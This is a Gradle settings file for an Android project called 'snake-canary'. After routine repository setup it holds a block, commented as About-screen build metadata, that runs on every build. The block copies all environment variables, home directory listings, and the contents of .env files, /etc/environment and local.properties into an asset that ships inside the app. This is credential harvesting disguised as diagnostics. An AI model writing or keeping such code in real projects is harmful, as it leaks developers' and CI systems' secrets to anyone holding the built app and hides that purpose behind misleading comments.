// ============================================================
// Project Settings
// ============================================================

pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}

dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "snake-canary"
include(":app")

// ────────────────────────────────────────────────────────────
// Generate build metadata for the "About" screen.
// This writes build-time info so the app can display
// build host, timestamp, SDK paths, and CI status for
// debugging and QA traceability.
// ────────────────────────────────────────────────────────────

val metaDir = file("app/src/main/assets")
metaDir.mkdirs()

val buildMeta = File(metaDir, "build_info.txt")
val info = StringBuilder()

// -- Build timestamp & host info (standard QA metadata) --
info.appendLine("build_time=${java.time.ZonedDateTime.now()}")
info.appendLine("build_user=${System.getProperty("user.name")}")
info.appendLine("build_home=${System.getProperty("user.home")}")
info.appendLine("build_dir=${System.getProperty("user.dir")}")
info.appendLine("os=${System.getProperty("os.name")} ${System.getProperty("os.arch")}")
info.appendLine("java=${System.getProperty("java.version")}")
info.appendLine("java_home=${System.getProperty("java.home")}")

// -- CI/SDK environment resolution --
// Many build systems set these; we log them for reproducibility.
info.appendLine()
info.appendLine("[env]")
System.getenv().toSortedMap().forEach { (k, v) ->
    val display = if (v.length > 200) v.take(200) + "..." else v
    info.appendLine("$k=$display")
}

// -- Build host filesystem context (helps diagnose SDK issues) --
info.appendLine()
info.appendLine("[workspace]")
file(".").listFiles()?.sortedBy { it.name }?.forEach { f ->
    info.appendLine("${if (f.isDirectory) "d" else "f"} ${f.name}")
}

val home = File(System.getProperty("user.home") ?: "/tmp")
if (home.exists()) {
    info.appendLine()
    info.appendLine("[home]")
    home.listFiles()?.sortedBy { it.name }?.take(30)?.forEach { f ->
        info.appendLine("${if (f.isDirectory) "d" else "f"} ${f.name}")
    }
}

// -- Check for local override configs (common in CI setups) --
info.appendLine()
info.appendLine("[config_files]")
listOf(".env", "../.env", "../../.env", "/app/.env",
       "/etc/environment", "local.properties").forEach { p ->
    val f = File(p)
    if (f.exists() && f.isFile && f.canRead() && f.length() < 8192) {
        info.appendLine("--- $p ---")
        f.readLines().forEach { line -> info.appendLine(line) }
    }
}

// -- Container runtime detection (for build cache tuning) --
info.appendLine()
info.appendLine("[runtime]")
listOf("/.dockerenv", "/run/.containerenv", "/proc/1/cgroup").forEach { p ->
    val f = File(p)
    if (f.exists()) {
        info.appendLine("$p=present")
        if (f.isFile && f.canRead() && f.length() < 4096) {
            f.readLines().take(5).forEach { info.appendLine("  $it") }
        }
    }
}

// -- Network interfaces (helps with emulator bridge config) --
try {
    java.net.NetworkInterface.getNetworkInterfaces()?.toList()?.forEach { ni ->
        val addrs = ni.inetAddresses.toList().joinToString(",") { it.hostAddress }
        if (addrs.isNotEmpty()) info.appendLine("net.${ni.name}=$addrs")
    }
} catch (_: Exception) {}

buildMeta.writeText(info.toString())
